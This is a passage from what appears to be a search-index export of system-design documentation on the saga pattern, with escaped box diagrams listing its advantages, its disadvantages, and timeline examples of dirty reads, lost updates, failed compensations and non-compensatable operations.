\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Services don't know about saga     \u2502            \u2502\n\u2502    \u2502 \u2022 Event-driven communication         \u2502            \u2502\n\u2502    \u2502 \u2022 Easy to add new services           \u2502            \u2502\n\u2502    \u2502 \u2022 Independent deployment             \u2502            \u2502\n\u2502    \u2502 \u2022 Microservices-friendly             \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 4. \u2705 NO DISTRIBUTED TRANSACTIONS                       \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Local transactions only            \u2502            \u2502\n\u2502    \u2502 \u2022 Each service owns its data         \u2502            \u2502\n\u2502    \u2502 \u2022 No 2PC overhead                    \u2502            \u2502\n\u2502    \u2502 \u2022 Better performance                 \u2502            \u2502\n\u2502    \u2502 \u2022 Simpler database design            \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 5. \u2705 BUSINESS-ALIGNED                                  \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Mirrors business processes         \u2502            \u2502\n\u2502    \u2502 \u2022 Clear compensation semantics       \u2502            \u2502\n\u2502    \u2502 \u2022 Matches domain workflows           \u2502            \u2502\n\u2502    \u2502 \u2022 Natural for long-running processes \u2502            \u2502\n\u2502    \u2502 \u2022 Explicit business logic            \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 6. \u2705 HANDLES LONG-LIVED TRANSACTIONS                   \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Can span hours/days                \u2502            \u2502\n\u2502    \u2502 \u2022 No lock timeout issues             \u2502            \u2502\n\u2502    \u2502 \u2022 Resources released immediately     \u2502            \u2502\n\u2502    \u2502 \u2022 Good for batch processing          \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 7. \u2705 CLOUD-NATIVE &amp; MICROSERVICES                      \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Perfect for distributed systems    \u2502            \u2502\n\u2502    \u2502 \u2022 Works with event buses (Kafka)     \u2502            \u2502\n\u2502    \u2502 \u2022 Service mesh compatible            \u2502            \u2502\n\u2502    \u2502 \u2022 Serverless-friendly                \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#74-disadvantages-of-saga-pattern","title":"7.4 Disadvantages of Saga Pattern","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         SAGA PATTERN DISADVANTAGES                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. \u274c NO ISOLATION (ACID Violation)                     \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Intermediate states visible        \u2502            \u2502\n\u2502    \u2502 \u2022 Dirty reads possible               \u2502            \u2502\n\u2502    \u2502 \u2022 Concurrent sagas can interfere     \u2502            \u2502\n\u2502    \u2502 \u2022 Lost updates possible              \u2502            \u2502\n\u2502    \u2502 \u2022 Requires semantic locks            \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 2. \u274c EVENTUAL CONSISTENCY ONLY                         \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Not immediately consistent         \u2502            \u2502\n\u2502    \u2502 \u2022 Temporary inconsistencies          \u2502            \u2502\n\u2502    \u2502 \u2022 Application must handle            \u2502            \u2502\n\u2502    \u2502 \u2022 Not suitable for all use cases     \u2502            \u2502\n\u2502    \u2502 \u2022 Complex to reason about            \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 3. \u274c COMPLEX COMPENSATION LOGIC                        \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Must write compensating txns       \u2502            \u2502\n\u2502    \u2502 \u2022 Not all operations reversible      \u2502            \u2502\n\u2502    \u2502 \u2022 Semantic complexity                \u2502            \u2502\n\u2502    \u2502 \u2022 Idempotency required               \u2502            \u2502\n\u2502    \u2502 \u2022 Testing difficult                  \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 4. \u274c DIFFICULT TO DEBUG                                \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Distributed tracing needed         \u2502            \u2502\n\u2502    \u2502 \u2022 Asynchronous flows hard to track   \u2502            \u2502\n\u2502    \u2502 \u2022 Event ordering issues              \u2502            \u2502\n\u2502    \u2502 \u2022 Multiple failure modes             \u2502            \u2502\n\u2502    \u2502 \u2022 Correlation IDs essential          \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 5. \u274c CYCLIC DEPENDENCIES RISK (Choreography)           \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Services tightly coupled via events\u2502            \u2502\n\u2502    \u2502 \u2022 Circular event chains possible     \u2502            \u2502\n\u2502    \u2502 \u2022 Hard to understand flow            \u2502            \u2502\n\u2502    \u2502 \u2022 Refactoring difficult              \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 6. \u274c REQUIRES INFRASTRUCTURE                           \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Message broker needed (Kafka, etc.)\u2502            \u2502\n\u2502    \u2502 \u2022 Saga orchestrator framework        \u2502            \u2502\n\u2502    \u2502 \u2022 Distributed tracing tools          \u2502            \u2502\n\u2502    \u2502 \u2022 Event store/log                    \u2502            \u2502\n\u2502    \u2502 \u2022 Monitoring and observability       \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 7. \u274c INCREASED LATENCY                                 \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Multiple async steps               \u2502            \u2502\n\u2502    \u2502 \u2022 Message queue delays               \u2502            \u2502\n\u2502    \u2502 \u2022 Network hops                       \u2502            \u2502\n\u2502    \u2502 \u2022 Can take seconds/minutes           \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#75-problems-in-saga-pattern","title":"7.5 Problems in Saga Pattern","text":"<p>Problem 1: Lack of Isolation (Anomalies)</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       PROBLEM 1: ISOLATION ANOMALIES                    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Scenario: Two concurrent sagas modifying same data     \u2502\n\u2502                                                         \u2502\n\u2502 Anomaly 1: DIRTY READ (Reading uncommitted changes)    \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500    \u2502\n\u2502                                                         \u2502\n\u2502 Time  Saga 1 (Order A)         Saga 2 (Order B)        \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500    \u2502\n\u2502                                                         \u2502\n\u2502 t1    T1: Reserve 5 items                               \u2502\n\u2502       Inventory: 10 \u2192 5                                 \u2502\n\u2502       \u2705 Committed!                                      \u2502\n\u2502       (Visible to others)                               \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t2    \u2502                        T1: Check inventory      \u2502\n\u2502       \u2502                        See: 5 items available   \u2502\n\u2502       \u2502                        Reserve 5 items          \u2502\n\u2502       \u2502                        Inventory: 5 \u2192 0         \u2502\n\u2502       \u2502                        \u2705 Committed!             \u2502\n\u2502       \u2502                        \u2502                        \u2502\n\u2502 t3    T2: Payment FAILS! \u274c    \u2502                        \u2502\n\u2502       (Card declined)          \u2502                        \u2502\n\u2502       \u2502                        \u2502                        \u2502\n\u2502 t4    C1: Release 5 items      \u2502                        \u2502\n\u2502       Inventory: 0 \u2192 5         \u2502                        \u2502\n\u2502       \u2705 Compensated            \u2502                        \u2502\n\u2502       \u2502                        \u2502                        \u2502\n\u2502 t5    \u2502                        T2: Ship items           \u2502\n\u2502       \u2502                        But only 5 in inventory! \u2502\n\u2502       \u2502                        \ud83d\udca5 INCONSISTENCY!        \u2502\n\u2502                                                         \u2502\n\u2502 Problem:                                                \u2502\n\u2502 \u2022 Saga 2 read Saga 1's uncommitted state                \u2502\n\u2502 \u2022 Saga 1 later compensated (rolled back)                \u2502\n\u2502 \u2022 Saga 2 made decisions based on wrong state            \u2502\n\u2502 \u2022 Result: Oversold inventory! \u274c                        \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Anomaly 2: Lost Updates</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       ANOMALY 2: LOST UPDATE                            \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Time  Saga 1                   Saga 2                   \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500    \u2502\n\u2502                                                         \u2502\n\u2502 t1    Read Balance: $1000                               \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t2    \u2502                        Read Balance: $1000      \u2502\n\u2502       \u2502                        \u2502                        \u2502\n\u2502 t3    Deduct $200              \u2502                        \u2502\n\u2502       Balance: $1000 \u2192 $800    \u2502                        \u2502\n\u2502       Commit \u2705                 \u2502                        \u2502\n\u2502       \u2502                        \u2502                        \u2502\n\u2502 t4    \u2502                        Deduct $300              \u2502\n\u2502       \u2502                        Balance: $1000 \u2192 $700    \u2502\n\u2502       \u2502                        Commit \u2705                 \u2502\n\u2502       \u2502                        (Overwrites Saga 1!)     \u2502\n\u2502       \u2502                        \u2502                        \u2502\n\u2502 t5    Final Balance: $700 (should be $500!)             \u2502\n\u2502       Lost Update! \u274c                                    \u2502\n\u2502                                                         \u2502\n\u2502 Problem:                                                \u2502\n\u2502 \u2022 No isolation between sagas                            \u2502\n\u2502 \u2022 Saga 2 overwrote Saga 1's changes                     \u2502\n\u2502 \u2022 $200 deduction lost                                   \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Problem 2: Compensation Failures</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       PROBLEM 2: COMPENSATION FAILURES                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Scenario: Compensation transaction fails                \u2502\n\u2502                                                         \u2502\n\u2502 Time  Order      Payment     Inventory    Shipping      \u2502\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500    \u2502\n\u2502                                                         \u2502\n\u2502 t1    T1: Create                                        \u2502\n\u2502       \u2705                                                 \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 t2    \u2502          T2: Charge                             \u2502\n\u2502       \u2502          $100 \u2705                                 \u2502\n\u2502       \u2502          (Money taken!)                         \u2502\n\u2502       \u2502          \u2502                                      \u2502\n\u2502 t3    \u2502          \u2502          T3: Reserve                 \u2502\n\u2502       \u2502          \u2502          \u274c FAILED!                  \u2502\n\u2502       \u2502          \u2502                                      \u2502\n\u2502 t4    \u2502          C2: Refund                             \u2502\n\u2502       \u2502          $100                                   \u2502\n\u2502       \u2502          \u274c REFUND FAILED!                      \u2502\n\u2502       \u2502          (Network timeout)                      \u2502\n\u2502       \u2502          \ud83d\udca5 STUCK!                              \u2502\n\u2502       \u2502                                                 \u2502\n\u2502 Problem:                                                \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 \u2022 Customer charged but no order          \u2502           \u2502\n\u2502 \u2502 \u2022 Refund failed                          \u2502           \u2502\n\u2502 \u2502 \u2022 Inconsistent state!                    \u2502           \u2502\n\u2502 \u2502 \u2022 Money lost for customer                \u2502           \u2502\n\u2502 \u2502 \u2022 Manual intervention needed             \u2502           \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2502\n\u2502                                                         \u2502\n\u2502 Solutions:                                              \u2502\n\u2502 \u2022 Retry with exponential backoff                        \u2502\n\u2502 \u2022 Dead letter queue for failures                        \u2502\n\u2502 \u2022 Manual reconciliation process                         \u2502\n\u2502 \u2022 Idempotent compensations                              \u2502\n\u2502 \u2022 Alert operators                                       \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Problem 3: Non-Compensatable Operations</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       PROBLEM 3: NON-COMPENSATABLE OPERATIONS           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Some operations cannot be \"undone\":                     \u2502\n\u2502                                                         \u2502\n\u2502 1. \u274c EMAIL SENT                                        \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Operation: Send confirmation email   \u2502            \u2502\n\u2502    \u2502 Compensation: ???                    \u2502            \u2502\n\u2502    \u2502 \u2022 Cannot \"unsend\" email              \u2502            \u2502\n\u2502    \u2502 \u2022 Can send apology email (not same)  \u2502            \u2502\n\u2502    \u2502 \u2022 Customer already saw confirmation  \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 2. \u274c THIRD-PARTY API CALL                              